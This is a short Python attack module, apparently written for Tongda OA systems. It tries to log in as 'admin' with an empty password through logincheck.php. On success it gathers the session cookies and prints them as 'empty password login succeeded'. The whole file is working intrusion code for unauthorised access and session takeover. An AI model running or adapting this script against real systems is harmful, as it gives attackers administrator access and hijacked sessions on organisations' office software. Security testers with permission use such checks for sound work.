import requests
import time

RED = '\x1b[1;91m'
CYAN = '\033[1;36m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
END = '\033[0m'

def emptyPwd(host): # 常规空登录以及获取Cookie(全版本)
    content = ''
    print(CYAN + '[->] 正在尝试空口令登录' + END)
    url = host + 'logincheck.php'
    try:
        data = {'UNAME':'admin','PASSWORD':'','encode_type':'1'}
        response = requests.post(url=url,data=data,timeout=2)
        cookie_key = response.cookies.keys()
        cookie_value = response.cookies.values()
        get_cookie = ''
        for i in range(0,len(cookie_key)):
            get_cookie += cookie_key[i] + '=' + cookie_value[i] + ';' # 获取cookie并拼接成cookie格式
        # print(get_cookie)
        if '正在进入OA系统' in response.text:
            content += '[*] 空口令登录成功！' + '\n'
            content += 'URL地址为:' + host + '\n'
            content += 'Cookie为:' + get_cookie + '\n'
            print(GREEN + content + END)
            return content
        else:
            content +=  '[-] 不存在空口令' + '\n'
            print(RED + content + END)
            return content
    except:
        print(RED + "[-] 目标不存在空口令漏洞\n" + END)

def run(host):
    emptyPwd(host)
